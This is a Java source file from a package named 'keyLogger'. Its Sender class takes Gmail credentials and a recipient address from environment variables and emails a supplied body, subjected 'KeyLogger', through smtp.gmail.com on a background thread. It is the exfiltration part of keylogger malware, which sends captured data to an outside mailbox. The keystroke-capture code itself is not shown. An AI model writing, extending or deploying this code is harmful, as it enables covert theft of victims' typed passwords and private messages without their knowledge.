package scripts.keyLogger;

import java.util.Map;
import java.util.Properties;
import javax.mail.MessagingException;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.AddressException;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMessage.RecipientType;


public class Sender{

	private Sender() {
	};
	
	private static Map<String, String> map = System.getenv();
	private static final String SENDERS_GMAIL = map.get("SENDERS_GMAIL");
	private static final String SENDERS_PASSWORD = map.get("SENDERS_PASSWORD");
	private static final String RECIEVES_EMAIL = map.get("RECIEVES_EMAIL");
	private static Properties mailServerProperties;
	private static Session mailSession;
	private static MimeMessage mailMessage;

	public static void sendMail(String body) throws AddressException, MessagingException {
		mailServerProperties = System.getProperties();
		mailServerProperties.put("mail.smtp.port", "587");
		mailServerProperties.put("mail.smtp.auth", "true");
		mailServerProperties.put("mail.smtp.starttls.enable", "true");

		mailSession = Session.getDefaultInstance(mailServerProperties);
		mailMessage = new MimeMessage(mailSession);
		mailMessage.addRecipient(RecipientType.BCC, new InternetAddress(RECIEVES_EMAIL));
		mailMessage.setSubject("KeyLogger");
		mailMessage.setContent(body, "text/html");
		
		Thread th = new Thread(new Runnable() {
			@Override
			public void run() {
				try {
					Transport transport = mailSession.getTransport("smtp");
					transport.connect("smtp.gmail.com", SENDERS_GMAIL, SENDERS_PASSWORD);
					transport.sendMessage(mailMessage, mailMessage.getAllRecipients());
					transport.close();
				} catch (MessagingException e) {
					e.printStackTrace();
				}
			}
		});
		th.start();
	}
 
}
